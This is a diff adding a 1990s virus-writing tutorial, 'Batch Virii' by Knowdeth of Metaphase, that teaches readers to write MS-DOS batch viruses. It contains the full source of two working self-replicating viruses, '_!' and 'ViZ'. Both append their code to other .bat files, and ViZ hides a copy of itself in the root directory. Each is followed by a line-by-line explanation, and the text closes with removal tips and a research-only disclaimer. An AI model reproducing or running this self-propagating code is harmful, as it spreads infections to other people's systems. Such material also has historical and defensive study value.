@@ -1,0 +1,126 @@
+               'ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ'
+                บ ********::::: Batch Virii :::::********* บ
+                บ ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ บ
+                บ ****** -= Knowdeth / Metaphase=- ******* บ
+               'ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู'
+
+
+
+Utils you will need:
+
+A text editor of some sort.
+A working  knollage of MS-DOS
+
+About batch virii:
+       
+Batch is a language created and used in MS-DOS. They are created by simple text
+editors, ie Edit.com or Notepad.exe. Most batch virii use very simple means of
+copying and spreding. They will just append their code at the end of other
+*.bat in the hopes they will be ran. Like many HLL's you can use very
+"Structured programming" in the form of subs and loops with if lines for all
+error handling, much like Qbasic.
+
+Advanced batch virii can also rename a binary then copy itself to a batch with
+the same name. They may use machine code to drop or hide payloads such as *.com
+files thru debugger, and may also use ansi bombs as a destructive payload.
+Makeing the the "trojan" able to reproduce itself. I do -NOT- agree at all with
+destructive payloads in virii, and you will not see them in this paper!
+
+The Code:                     
+ออออออออออออออออออออออออออออออออ"_!" by Wavefuncออออออออออออออออออออออออออออออออ
+      @ctty nul._!
+      for %%a in (*.bat ..\*.bat) do set _!=%%a
+      find "_!"<%_!%
+      if errorlevel 1 find "_!"<%0.BAT>>%_!%
+      ctty con._!
+
+ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+
+This is a *very* simple batch virus appender
+
+@    - when this in position 1 in front of the command, @ prevents the command
+       from being echoed to the console, even if echo is on.
+ctty - changes terminal device used by the computer
+nul  - sends the output of the file to nowhere
+%%a  - scan for batches and for each one found call program in the variable
+       then the name of the batch to check (%%a). 
+find - check to see if the virus is present in target
+if errorlevel 1 - branch "if" there, get the next filename
+>>   - appends the output to the end of a file
+
+Now for somthing more advanced.
+  
+อออออออออออออออออออออออออออออออออออViZ by -KD-ออออออออออออออออออออออออออออออออออ
+    :: [ViZ] by -KD- of Metaphase
+    @echo off%_ViZ%
+    if '%1=='ViZ goto ViZ%2
+    if exist c:\_ViZ.bat goto ViZstart
+    if not exist %0.bat goto ViZexit
+    find "ViZ"<%0.bat>c:\_ViZ.bat
+    attrib c:\_ViZ.bat +h
+    :ViZstart
+    if '%!ViZ%=='- goto ViZexit
+    set !ViZ=%!ViZ%-
+    command /e:5000 /c c:\_ViZ ViZ v
+    :DaViZ
+    goto ViZexit
+    :ViZv
+    for %%a in (*.bat) do call c:\_ViZ ViZ inf %%a 
+    exit ViZ
+    :ViZ_inf
+    find "ViZ"<%3>nul
+    if not errorlevel 1 goto ViZlevel
+    type c:\_ViZ.bat>>%3
+    exit ViZ
+    :ViZlevel
+    set ViZ!=%ViZ!%-
+    if %ViZ!%==- exit 
+    :ViZexit
+
+ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+This is a appender that makes one run per session. It looks for and infects one
+batch per run in the current dir only.
+
+::      - a REM line
+@       - when this in position 1 in front of the command, @ prevents the
+          command from being echoed to the console, even if echo is on.
+if 1%   - branches if 1st parm
+if exist- branches if file is there
+if not exist - branches if not there
+find    - check to see if the virus is present in target
+attrib  - hide our virus
+set     - set the variables
+command - do the command
+for a%% - look for variables in batch
+nul     - sends the output of the file to nowhere
+type    - appends the file
+exit    - anything can be after the "exit", but its nice to 
+          name the exit :-)
+ViZexit - your all done
+
+
+Removal of batch virii:
+       
+Batch virii work by adding code to the beginning and/or the end of the infected
+.bat files. All infected code can be removed by loading the infected .bat in to
+a text editor and removing the added lines. Some may use a hidden copy of
+themselves in root and/or other dir's. 
+The command DIR /AH /S shows ALL hidden files on a drive. You will then need to
+use attrib *.bat -s -r -h then use del *.bat, with "*.bat" as the virus name.
+
+
+ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
+This my FIRST attempt at a tutorial. If you like it or have and comments I can
+be reached at #virus on undernet. This is also in a way here to help
+wordbasic/VBA writers. Because to be good at macros you must be good at batch.
+P.S. HLL is not dead!
+
+(C)Knowdeth
+You may distribute this paper freely, without any
+changes or modifications. It cannot be used
+for any comercial purpose without my permission.
+The use of this code is ONLY for research and learning
+purposes and may NOT be used to cause harm to any 
+computer system.
+
+
